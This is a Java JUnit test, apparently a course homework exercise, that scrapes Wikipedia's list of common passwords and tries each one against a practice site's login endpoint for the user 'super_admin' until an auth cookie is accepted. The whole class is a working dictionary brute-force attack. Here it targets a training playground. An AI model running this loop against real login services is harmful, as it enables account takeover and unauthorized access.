package tasks;

import io.restassured.RestAssured;
import io.restassured.response.Response;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.junit.jupiter.api.Test;

import java.io.IOException;
import java.util.*;
import java.util.stream.Collectors;

public class Exercise9 {

    @Test
    public void bruteForce() throws IOException {
        String getCookieUrl = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework";
        String checkCookieUrl = "https://playground.learnqa.ru/ajax/api/check_auth_cookie";

        List<String> passwords = getPasswords();

        for (String p : passwords) {
            Map<String, String> payload = new HashMap<>();
            payload.put("login", "super_admin");
            payload.put("password", p);

            Response response = RestAssured
                    .given()
                    .body(payload)
                    .post(getCookieUrl)
                    .andReturn();
            String cookie = response.getCookies().get("auth_cookie");

            Response checkCookieResponse = RestAssured
                    .given()
                    .body(payload)
                    .cookie("auth_cookie", cookie)
                    .post(checkCookieUrl)
                    .andReturn();

            if (checkCookieResponse.asString().equals("You are authorized")) {
                System.out.println(checkCookieResponse.asString());
                System.out.println("Correct password is: " + p);
                break;
            }
        }
    }

    public List<String> getPasswords() throws IOException {
        String url = "https://en.wikipedia.org/wiki/List_of_the_most_common_passwords";
        Document doc = Jsoup.connect(url).get();

        String text = doc.select("#mw-content-text > div.mw-parser-output > table:nth-child(12) > tbody")
                .select("td:not([align=\"center\"])")
                .text()
                .replaceAll("\\[a\\]", "");

        return Arrays
                .stream(text.split(" "))
                .distinct()
                .collect(Collectors.toList());

    }
}
